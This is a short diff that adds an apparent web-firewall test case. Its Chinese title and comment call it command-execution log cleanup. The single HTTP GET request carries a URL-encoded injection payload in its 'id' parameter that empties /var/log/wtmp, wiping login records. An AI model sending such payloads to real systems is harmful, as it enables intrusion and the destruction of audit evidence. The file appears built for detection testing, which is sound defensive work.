@@ -1,0 +1,9 @@
+# 命令执行_痕迹清理-06507058
+# 清空wtmp登录信息日志文件
+GET /?id=echo%20%3E%20%2Fvar%2Flog%2Fwtmp&bid=hd_tag_m8mv2600 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2600
+RM-PRO-Token: dcc43bfde4885bbcf1918cc85cb1ef1d
+RM-PRO-Time: 1742808518391
+User-Agent: curl/7.83.1
+
